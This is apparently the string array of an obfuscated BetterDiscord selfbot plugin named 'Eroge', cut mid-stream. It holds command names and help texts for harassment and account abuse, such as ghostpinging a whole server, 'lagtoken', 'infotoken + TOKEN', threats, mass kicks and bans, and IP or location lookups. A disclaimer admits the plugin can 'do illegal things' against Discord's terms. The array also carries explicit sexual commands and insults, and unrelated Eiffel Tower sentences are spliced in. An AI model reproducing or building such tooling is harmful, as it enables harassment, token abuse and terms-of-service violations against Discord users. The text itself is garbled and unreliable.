⡀⡙⠀⠈⢧⠀⠡⡀⢉⠀⠀⠀⠀⣴⣿⡫⣋⣥⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⡗⠃⠐⠀⠈⣷⡀⢳⡄⠂⠀⠀⣸⣿⡛⠑⠛⢿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⡇⡀⠂⡀⠀⣸⢱⡈⠇⠐⠄⡠⣿⡟⠁⠀⠀⣸⣿⣿⣿⡟⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⣿⡐⡀⠀⢠⠏⠀⢳⡘⡄⠈⠀⢿⡿⠀⢻⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⣿⣧⠐⢀⡏⠀⠀⠀⢳⡴⡀⠀⢸⣿⡄⠀⠉⠛⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣶⣶⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⣿⣿⣆⠀⠐⡀⠀⠀⠀⢻⣷⡀⠀⠃⠙⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⣿⣿⣿⣆⠀⠙⣄⠀⠀⠀⠱⣕⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠻⣿⣿⣿⣦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴\n                    ⣿⣿⣿⣿⣧⡀⠘⢦⡀⠀⠀⠈⢢⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠿⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿\n                    ⣿⣿⣿⣿⣿⣷⢄⠈⠻⣆⠀⠀⠀⠑⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿", "pussyWankGif", "https://minecraftskinstealer.com/achievement/", "MESSAGE", "holoero ```***", "https://i.imgur.com/uz9HPEU.png", "***Transform your text to green.***", " have delete the message: **", "▬▬▬▬▬▬▬▬▬▬▬🔘▬▬▬ ⇆　　◁　　❚❚　　▷　　↻", "now", "captcha", "᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼\n                    ᲼᲼᲼᲼᲼᲼", "seestatus", "embed + TEXT ```***", "https://i.imgur.com/b1zgFMM.jpg", " added.", "Yes!", "▬▬▬▬▬▬▬▬▬▬▬▬🔘▬▬ ⇆　　◁　　❚❚　　▷　　↻", "holo ```***", "status1", "prototype", "Probably", "***Get a notif when someone start to typing on your DM***", "***Send a ascii art of a among us red sus.***", "setUrl", "name", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Status has been reset.", "***Random image of Girl Solo Gif***", "***Send a image approved***", "kanna", "eroyuri ```***", " ***give a kiss to*** ", "***catch some fish***", "***Annoy everyone with a long story***", "symbols11 ```**", "account ```***", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > You have join ", "Xiq-WQ", "nsfw ```***", "‎‎‎‎‎‎‎‎‎‎\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠄⠄⠄⠄⠄⠄⠄⠄⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⡟⠁⠄⠄⠄⠄⣠⣤⣴⣶⣶⣶⣶⣤⡀⠈⠙⢿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⡟⠄⠄⠄⠄⠄⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠄⠈⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⠁⠄⠄⠄⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠄⠄⢺⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⡄⠄⠄⠄⠙⠻⠿⣿⣿⣿⣿⠿⠿⠛⠛⠻⣿⡄⠄⣾⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⡇⠄⠄⠁ ⭕ ⠄⢹⣿⡗⠄ ⭕ ⢄⡀⣾⢀⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⡇⠘⠄⠄⠄⢀⡀⠄⣿⣿⣷⣤⣤⣾⣿⣿⣿⣧⢸⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⡇⠄⣰⣿⡿⠟⠃⠄⣿⣿⣿⣿⣿⡛⠿⢿⣿⣷⣾⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⡄⠈⠁⠄⠄⠄⠄⠻⠿⢛⣿⣿⠿⠂⠄⢹⢹⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⡐⠐⠄⠄⣠⣀⣀⣚⣯⣵⣶⠆⣰⠄⠞⣾⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣷⡄⠄⠄⠈⠛⠿⠿⠿⣻⡏⢠⣿⣎⣾⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⡿⠟⠛⠄⠄⠄⠄⠙⣛⣿⣿⣵⣿⡿⢹⡟⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⠿⠿⠋⠉⠄⠄⠄⠄⠄⠄⠄⣀⣠⣾⣿⣿⣿⡟⠁⠹⡇⣸⣿⣿⣿⣿⣿⣿\n                    ⠁⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠄⠙⠿⠿⠛⠋⠄⣸⣦⣠⣿⣿⣿⣿⣿⣿⣿\n                    ", "platform", "***Threat someone with his pfp***", "magik", "setprefix", '{"url":"', "> Disclaimer before using this plugins, please read it !\n\n\nThis plugins is not only for having fun, you can do illegal things, so don't use it if you don't want to be banned, i invite you to watch all ToS from Discord for that. Don't use it on some big server, they can warn your account for 'selfbot' or any others things. If your account have any problems, I am in no way responsible to what can happen, so don't be rude you was warned. If for any reason, you want to stop using this plugins, go ahead i just made this because i was bored :)", "light", "***Random gif***", "approved + MENTION ```***", "You need enter a message. ❌", "***Random Hentai ass image***", "phcomment", "***Change the user mentioned to gay***", "mod", "***Random anal picture***", "Long :", "||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​||||​|| @", "***Send a ascii art of a dick.***", "girlSoloGif", "50%", "statustime stop for stop it.", "***Want to commit a suicide***", "***Send a ascii art animated of a fortnite dance.***", "ISP:", "***Random hkitsune image***", " want to suicide 😭🔫", "▬▬▬▬▬▬▬▬▬▬▬▬▬🔘▬ ⇆　　◁　　❚❚　　▷　　↻", "***Change your text to bold.***", "slap", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣤\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿\n                        ⠀⠀⣶⠀⠀⣀⣤⣶⣤⣉⣿⣿⣤⣀\n                        ⠤⣤⣿⣤⣿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣀\n                        ⠀⠛⠿⠀⠀⠀⠀⠉⣿⣿⣿⣿⣿⠉⠛⠿⣿⣤\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⠛⠀⠀⠀⣶⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣀⣿⣿⣿⣿⣤⠀⣿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠿⣿⣿⣿⣿⣿⠿⠉⠉\n                        ⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠉\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣛⣿⣭⣶⣀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⠀⠀⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣉⠀⣶⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⠿\n                        ⠀⠀⠀⠀⠀⠀⠀⠛⠿⠛\n                        ", "minefont", "80%", "lagtoken", "/guilds/", "mee6rank ```***", "/users/@me", "iphonex", "setPresence", "**Skin Minecraft**", "setStatus", "8QDpLRJ", "ero", "reload", "Report mode enabled. ✅", "min", "***Send the image in jpeg format***", "**🔞 4K Picture 🔞**", "**🔞 Tentacle Picture 🔞**", "```Genre:```", "trap", "feetgif ```***", "dickart ```**", "***Send a tweet with the username of user and the text***", "***Random boobs picture***", "***Calculate how much love is possible with this member***", "pingzserver + TEXT ```**", " have wasted ", " want to have some sex with ", " have start typing in your DM.", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣶\n                        ⠀⠀⠀⠀⠀⣀⣀⠀⣶⣿⣿⠶\n                        ⣶⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣤⣤\n                        ⠀⠉⠶⣶⣀⣿⣿⣿⣿⣿⣿⣿⠿⣿⣤⣀\n                        ⠀⠀⠀⣿⣿⠿⠉⣿⣿⣿⣿⣭⠀⠶⠿⠿\n                        ⠀⠀⠛⠛⠿⠀⠀⣿⣿⣿⣉⠿⣿⠶\n                        ⠀⠀⠀⠀⠀⣤⣶⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⠒\n                        ⠀⠀⠀⠀⣀⣿⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⣿⣿⣿⠛⣭⣭⠉\n                        ⠀⠀⠀⠀⠀⣿⣿⣭⣤⣿⠛\n                        ⠀⠀⠀⠀⠀⠛⠿⣿⣿⣿⣭\n                        ⠀⠀⠀⠀⠀⠀⠀⣿⣿⠉⠛⠿⣶⣤\n                        ⠀⠀⠀⠀⠀⠀⣀⣿⠀⠀⣶⣶⠿⠿⠿\n                        ⠀⠀⠀⠀⠀⠀⣿⠛\n                        ⠀⠀⠀⠀⠀⠀⣭⣶\n                        ", "```EvolutionLine:```", "GET", "User is now whitelisted, write ", "hug", "「𝙈𝙚𝙣𝙪 𝘼𝙘𝙘𝙤𝙪𝙣𝙩」", "avatarURL", "members", "「𝙈𝙚𝙣𝙪 𝙉𝙎𝙁𝙒」", "trapnsfw ```***", "hentaigif", "rdmnickname", "**🔞 Thigh Picture 🔞**", "90%", "author", "Temperature :", "```NAME HISTORY:```", "isp", "/users/@me/settings", "***Transform your text to cyan.***", "***Send a random insult***", "fortnitedance", "imageUrl", "***Send random message like (=･ω･=)***", "***Send random message every 1 min to get high level on MEE6***", "You need enter a text. ❌", "🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", "animeass ```**", "/hypesquad/online", "slap + MENTION ```***", "species", "***(╯°□°）╯︵ ┻━┻***", "0_o", "🤗 ", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Time bio has been started do ", "infotoken + TOKEN ```***", "**「>>「REPORT LOGS」<<」**", "```md\n", "first", "autoblue", "***Random paizuri image***", "***Turn you into a ghost, invisible pp, invisible name***", "lat:", "insult ```***", "setDetails", "***Send a nude :drooling_face:***", "booru", "‎‎‎‎‎‎‎‎‎‎\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⠶⠀⠀⣀⣀\n                        ⠀⠀⠀⠀⠀⠀⣀⣀⣤⣤⣶⣿⣿⣿⣿⣿⣿\n                        ⠀⠀⣀⣶⣤⣤⠿⠶⠿⠿⠿⣿⣿⣿⣉⣿⣿\n                        ⠿⣉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⣤⣿⣿⣿⣀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⣿⣿⣶⣤\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⣿⣿⣿⣿⠿⣛⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠛⣿⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿⣿⠿⠀⣿⣿⣿⠛\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⠀⠀⣿⣿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⠿⣿⠀⠀⣿⣶\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⠛⠀⠀⣿⣿⣶\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⣿⣿⠤\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠿⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣀\n                        ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣶⣿\n                    ", "https://twitch.tv/monstercat", "ahegao ```**", "showConfirmationModal", "***Change your status to Spotify with your own text***", "date", "futanari ```***", "2148432pVMsSF", "css", "***Change your status to media status***", "edit", "boobs", "text ```***", "you fished", "console", "**Send nudes pls :3**", "mcuser", "https://nekos.life/api/v2/img/futanari", "setFooter", "setApplicationId", "toFixed", "https://nekobot.xyz/api/imagegen?type=phcomment&username=", "```Speed:```", "*** give a spank to ***", "ban", "troll ```**", "tweet", "banuser", "threats + MENTION ```***", "Sorry this location is invalid. ❌", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Text commands list sent.", "moment", "autoboldtext", "‎‎‎‎‎‎‎‎‎‎\n                                               ⢠⣿⣶⣄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣦⣄⣀⡀⣠⣾⡇⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⠀⠀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀\n                    ⠀⠀⠀⠀⢀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⢿⣿⣿⡇⠀⠀⠀⠀\n                    ⠀⣶⣿⣦⣜⣿⣿⣿⡟⠻⣿⣿⣿⣿⣿⣿⣿⡿⢿⡏⣴⣺⣦⣙⣿⣷⣄⠀⠀⠀\n                    ⠀⣯⡇⣻⣿⣿⣿⣿⣷⣾⣿⣬⣥⣭⣽⣿⣿⣧⣼⡇⣯⣇⣹⣿⣿⣿⣿⣧⠀⠀\n                    ⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠸⣿⣿⣿⣿⣿⣿⣿⣷⠀\n                    ", "wink", "Report mode disabled. ❌", "**🔞 Anal Picture 🔞**", "Auto Blue Text mode enabled. ✅", "setNickname", "45%", "Sauvestre added decorative arches to the base of the tower, a glass pavilion to the first level, and other embellishments.", "rainbowroles + ROLENAME ```***", "KICK_MEMBERS", "\n            ░░░░░░░░░░▄\n            ░░░░░░░░▄▐░▄▄█████▄▄\n            ░░░░░░▄█████████████▄▀▄▄░▄▄▄\n            ░░░░░█████████████████▄██████\n            ░░░░████▐█████▌████████▌█████▌\n            ░░░████▌█████▌█░████████▐▀██▀\n            ░▄█████░█████▌░█░▀██████▌█▄▄▀▄\n            ░▌███▌█░▐███▌▌░░▄▄░▌█▌███▐███░▀\n            ▐░▐██░░▄▄▐▀█░░░▐▄█▀▌█▐███▐█\n            ░░███░▌▄█▌░░▀░░▀██░░▀██████▌\n            ░░░▀█▌▀██▀░▄░░░░░░░░░███▐███\n            ░░░░██▌░░░░░░░░░░░░░▐███████▌\n            ░░░░███░░░░░▀█▀░░░░░▐██▐███▀▌\n            ░░░░▌█▌█▄░░░░░░░░░▄▄████▀░▀\n            ░░░░░░█▀██▄▄▄░▄▄▀▀▒█▀█░▀\n            ░░░░░░░░░▀░▀█▀▌▒▒▒░▐▄▄\n            ░░░░░░░░▄▄▀▀▄░░░░░░▄▀░▀▀▄▄\n            ░░░░░░▄▀░▄▀▄░▌░░░▄▀░░░░░░▄▀▀▄\n            ░░░░░▐▒▄▀▄▀░▌▀▄▄▀░░░░░░▄▀▒▒▒▐\n            ░░░░▐▒▒▌▀▄░░░░░▌░░░░▄▄▀▒▐▒▒▒▒▌\n            ░░░▐▒▒▐░▌░▀▄░░▄▀▀▄▀▀▒▌▒▐▒▒▒▒▐▐\n            ░░░▌▄▀░░░▄▀░█▀▒▒▒▒▀▄▒▌▐▒▒▒▒▒▌▌\n            ░░▄▀▒▐░▄▀░░░▌▒▐▒▐▒▒▒▌▀▒▒▒▒▒▐▒▌\n            \n            ᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼᲼    ᲼\nVersion 7.0", "status4", "default", "amethyste-api", "‎‎‎‎‎‎‎‎‎‎\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⡿⠟⠛⠛⠛⠛⢻⣿⣟⣛⣉⣉⣉⣉⠉⠉⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⠟⠋⠀⠁⠐⠂⢀⠖⠁⠀⠀⠀⠀⠀⠀⠈⠉⠲⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣤⣤⣄⣀⣠⠾⢯⣤⣦⣤⣤⣤⣀⡀⠀⠀⠀⢰⣿⡟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⣿⡟⠉⢾⣿⠟⢉⡉⠉⢹⣟⢿⣷⣦⢢⠘⣿⠃⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣿⡟⠀⠀⠸⠁⢰⣿⣷⣶⣤⣿⣷⠙⢿⡃⠀⠛⠀⠀⢻⣿⣿⣿⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⡿⠀⠀⠀⠀⠀⠚⠻⠿⣿⣟⣻⡿⠀⠈⠁⠀⠀⠀⠀⠀⠻⣿⣿⣿⣿⡿⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⡇⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠟⣿⠇⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣭⣕⡀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⣀⠉⠻⢿⣦⡀⠹⠙⣿⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⢀⣾⣷⣄⠀⣦⡻⣷⡀⠀⠸⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣶⣦⡀⠠⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣧⢿⣧⠄⠀⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⢀⣼⣿⣿⣿⣿⣿⣦⣄⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣏⡿⠃⣼⡿⠤⣰⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠀⠀⠛⠃⣠⣿⣿⣿⣿⣿⣿⣿\n                    ⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣧⡀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ⣿⣷⣄⠀⠀⠀⠀⠙⠿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿\n                    ", "troll", "randomHentaiGif", "editedmsg ```***", "loading ```***", "**```", "warn", "base_experience", "***Random hmidriff image***", "pokedex", "statusCode", "***Text commands 💬***", "approved.png", "**🔞 Hkitsune Picture 🔞**", "react", "createSpotifyRpc", "💻 Platform", "( ͡° ͜ʖ ͡°)", "**Change my mind**", "***Whitelist a friends then he can use some options", "BdApi", "sendnude", "Auto Info mode disabled. ❌", "setType", "girlexcited", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Status time added do ", "Auto Cyan Text mode disabled. ❌", "***Make a fact with your own custom text***", "***( ͡° ͜ʖ ͡°)***", "pussywank", "symbols ```***", "ça va ?", "false", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Please, enter a new prefix.", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Your theme has been changed to light.", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 🔪", "find", "spank", 'Eiffel openly acknowledged that inspiration for a tower came from the Latting Observatory built in New York City in 1853.[4] In May 1884, working at home, Koechlin made a sketch of their idea, described by him as "a great pylon, consisting of four lattice girders standing apart at the base and coming together at the top, joined together by metal trusses at regular intervals".', "923654116721446912", "file_url", "heapUsed", "╭∩╮（︶︿︶）╭∩╮", "autoboldtext ```**", "You need enter a question. ❌", "animeass", "punch", "addBlankField", "ahegao", "tentacle", "thigh ```***", "presence", " 👊", "CHANNEL", "misakiii-discordjs", " to gay**", "***DM message send a report for edited or deleted message***", "idle", "whentheimpostorissusv2", "forEach", "[̲̅$̲̅(̲̅ιοο̲̅)̲̅$̲̅]", "split", "cpu-stat", "kickuser + MENTION ```**", "***Edit every message to a yifive.***", "Maybe?", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Status commands list sent.", "utf8", "hypersquad", "Sorry this member do not exist.", "type", "▬▬▬▬▬▬▬▬▬▬▬▬▬▬🔘 ⇆　　◁　　❚❚　　▷　　↻", "trumptweet + TEXT ```***", "Region:", "XXn_KA", "symbols10", "kuni", "setTitle", "stopTyping", "hass", "885500353053859880", "gasm ```***", "multistream ```***", "\n> Discriminator: ", "changemymind", "get", "ghostping ```***", "eroYuri", "🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > You need enter a number.", " ⁰¹²³⁴⁵⁶⁷⁸⁹ᵃᵇᶜᵈᵉᶠᵍʰᶦʲᵏˡᵐⁿᵒᵖǫʳˢᵗᵘᵛʷˣʸᶻᴬᴮᶜᴰᴱᶠᴳᴴᴵᴶᴷᴸᴹᴺᴼᴾǫᴿˢᵀᵁⱽᵂˣʸᶻ", "Lag token has been stopped ❌", "***Ghostping every member of the guild***", "**🔞 Holo Picture 🔞**", "‎‎‎‎‎‎‎‎‎‎\n                    ⠄⠄⠄⢰⣧⣼⣯⠄⣸⣠⣶⣶⣦⣾⠄⠄⠄⠄⡀⠄⢀⣿⣿⠄⠄⠄⢸⡇⠄⠄\n                    ⠄⠄⠄⣾⣿⠿⠿⠶⠿⢿⣿⣿⣿⣿⣦⣤⣄⢀⡅⢠⣾⣛⡉⠄⠄⠄⠸⢀⣿⠄\n                    ⠄⠄⢀⡋⣡⣴⣶⣶⡀⠄⠄⠙⢿⣿⣿⣿⣿⣿⣴⣿⣿⣿⢃⣤⣄⣀⣥⣿⣿⠄\n                    ⠄⠄⢸⣇⠻⣿⣿⣿⣧⣀⢀⣠⡌⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⣿⣿⣿⠄\n                    ⠄⢀⢸⣿⣷⣤⣤⣤⣬⣙⣛⢿⣿⣿⣿⣿⣿⣿⡿⣿⣿⡍⠄⠄⢀⣤⣄⠉⠋⣰\n                    ⠄⣼⣖⣿⣿⣿⣿⣿⣿⣿⣿⣿⢿⣿⣿⣿⣿⣿⢇⣿⣿⡷⠶⠶⢿⣿⣿⠇⢀⣤\n                    ⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⡇⣿⣿⣿⣿⣿⣿⣷⣶⣥⣴⣿⡗\n                    ⢀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠄\n                    ⢸⣿⣦⣌⣛⣻⣿⣿⣧⠙⠛⠛⡭⠅⠒⠦⠭⣭⡻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠃⠄\n                    